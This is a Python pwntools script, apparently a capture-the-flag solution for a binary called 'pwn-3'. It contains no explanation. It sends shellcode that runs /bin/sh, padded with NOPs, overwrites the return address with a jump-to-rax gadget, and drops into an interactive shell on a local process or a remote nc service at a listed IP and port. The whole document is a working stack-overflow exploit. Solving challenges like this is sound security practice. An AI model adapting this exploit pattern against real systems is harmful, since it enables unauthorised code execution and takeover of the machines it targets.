#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pwn-3", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 103.185.44.122 25204"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
jmp2rax = 0x0040115e
sc = asm(shellcraft.amd64.linux.execve("/bin/sh", 0, 0))

io = start()
io.sendlineafter(b">> ", b"2")
payload = sc
payload = payload.ljust(0x70, b"\x90")
payload += flat(
    elf.bss(0xc00),
    jmp2rax,
)
io.sendlineafter(b"Feedback:  ", payload)

io.interactive()
